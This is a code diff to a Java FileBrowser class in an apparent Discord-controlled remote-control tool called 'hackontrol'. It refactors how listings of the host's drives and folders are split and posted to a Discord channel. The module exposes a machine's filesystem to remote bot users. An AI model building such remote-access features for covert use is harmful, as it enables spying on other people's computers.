@@ -1,8 +1,6 @@
 package com.khopan.hackontrol.module.file;
 
-import java.io.BufferedReader;
 import java.io.File;
-import java.io.StringReader;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Stack;
@@ -11,14 +9,12 @@ import com.khopan.hackontrol.Hackontrol;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
-import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.manager.interaction.ModalContext;
 import com.khopan.hackontrol.utils.HackontrolError;
+import com.khopan.hackontrol.utils.LargeMessage;
 import com.khopan.hackontrol.utils.interaction.HackontrolButton;
-import com.khopan.hackontrol.utils.sendable.ISendable;
 import com.khopan.hackontrol.utils.sendable.sender.ReplyCallbackSendable;
 
-import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
 import net.dv8tion.jda.api.interactions.Interaction;
 import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
 import net.dv8tion.jda.api.interactions.components.ItemComponent;
@@ -26,8 +22,6 @@ import net.dv8tion.jda.api.interactions.components.text.TextInput;
 import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
 import net.dv8tion.jda.api.interactions.modals.Modal;
 import net.dv8tion.jda.api.interactions.modals.ModalMapping;
-import net.dv8tion.jda.api.requests.restaction.MessageCreateAction;
-import net.dv8tion.jda.api.requests.restaction.interactions.ReplyCallbackAction;
 import net.dv8tion.jda.api.utils.messages.MessageCreateRequest;
 
 public class FileBrowser<T extends IReplyCallback & Interaction> {
@@ -203,93 +197,13 @@ public class FileBrowser<T extends IReplyCallback & Interaction> {
 
 	@SuppressWarnings("hiding")
 	private <T extends IReplyCallback & Interaction> void send(T callback) {
-		String fileText = this.buildFileText(this.file, ReplyCallbackSendable.of(callback));
-
-		if(fileText == null) {
-			return;
-		}
-
-		List<String> messageList = this.splitMessage(fileText, ReplyCallbackSendable.of(callback));
-
-		if(messageList == null) {
-			return;
-		}
-
-		String firstMessage = messageList.get(0);
-		messageList.remove(0);
-		ReplyCallbackAction replyCallbackAction = callback.reply(firstMessage);
 		boolean isRoot = this.file == null;
-
-		if(messageList.isEmpty()) {
-			this.actionRow(replyCallbackAction, isRoot);
-			replyCallbackAction.queue(InteractionManager :: callback);
-			return;
-		}
-
-		MessageChannel channel = (MessageChannel) callback.getChannel();
-		replyCallbackAction.queue(hook -> {
-			InteractionManager.callback(hook);
-			hook.retrieveOriginal().queue(message -> new Thread(() -> {
-				int size = messageList.size();
-				MessageCreateAction messageCreateAction;
-
-				if(size == 1) {
-					messageCreateAction = channel.sendMessage(messageList.get(0));
-					this.actionRow(messageCreateAction, isRoot, message.getIdLong());
-				} else {
-					long[] identifierList = new long[size];
-					identifierList[0] = message.getIdLong();
-
-					for(int i = 1; i < identifierList.length; i++) {
-						identifierList[i] = channel.sendMessage(messageList.get(i - 1)).complete().getIdLong();
-					}
-
-					messageCreateAction = channel.sendMessage(messageList.get(size - 1));
-					this.actionRow(messageCreateAction, isRoot, identifierList);
-				}
-
-				messageCreateAction.queue(InteractionManager :: callback);
-			}).start());
-		});
-	}
-
-	private List<String> splitMessage(String message, ISendable reply) {
-		BufferedReader reader = new BufferedReader(new StringReader(message));
 		StringBuilder builder = new StringBuilder();
-		List<String> messageList = new ArrayList<>();
-		String line;
-
-		try {
-			while((line = reader.readLine()) != null) {
-				line += '\n';
-
-				if(builder.length() + line.length() > 2000) {
-					messageList.add(builder.toString());
-					builder = new StringBuilder();
-				}
-
-				builder.append(line);
-			}
-
-			if(!builder.isEmpty()) {
-				messageList.add(builder.toString());
-			}
-		} catch(Throwable Errors) {
-			HackontrolError.throwable(reply, Errors);
-			return null;
-		}
-
-		return messageList;
-	}
-
-	private String buildFileText(File root, ISendable reply) {
-		StringBuilder builder = new StringBuilder();
-		boolean isRoot = root == null;
-		File[] files = isRoot ? File.listRoots() : root.listFiles();
+		File[] files = isRoot ? File.listRoots() : this.file.listFiles();
 
 		if(files == null || files.length == 0) {
-			HackontrolError.message(reply, "Empty file list");
-			return null;
+			HackontrolError.message(ReplyCallbackSendable.of(callback), "Empty file list");
+			return;
 		}
 
 		this.fileList.clear();
@@ -312,19 +226,20 @@ public class FileBrowser<T extends IReplyCallback & Interaction> {
 		}
 
 		if(this.fileList.isEmpty() && this.folderList.isEmpty()) {
-			HackontrolError.message(reply, "No files available");
-			return null;
+			HackontrolError.message(ReplyCallbackSendable.of(callback), "No files available");
+			return;
 		}
 
 		builder.append("**");
-		String name = isRoot ? "SYSTEMROOT" : root.getAbsolutePath();
+		String name = isRoot ? "SYSTEMROOT" : this.file.getAbsolutePath();
 		Hackontrol.LOGGER.info("File Browser: '{}'", name);
 		builder.append(name.replace("\\", "\\\\"));
 		builder.append("**");
 		int ordinal = 1;
 		ordinal = this.addList(builder, this.fileList, "File", ordinal, isRoot);
 		ordinal = this.addList(builder, this.folderList, "Folder", ordinal, isRoot);
-		return builder.toString();
+		String fileText = builder.toString();
+		LargeMessage.send(fileText, callback, (request, identifiers) -> this.actionRow(request, this.file == null, identifiers));
 	}
 
 	private int addList(StringBuilder builder, List<File> list, String name, int ordinal, boolean isRoot) {
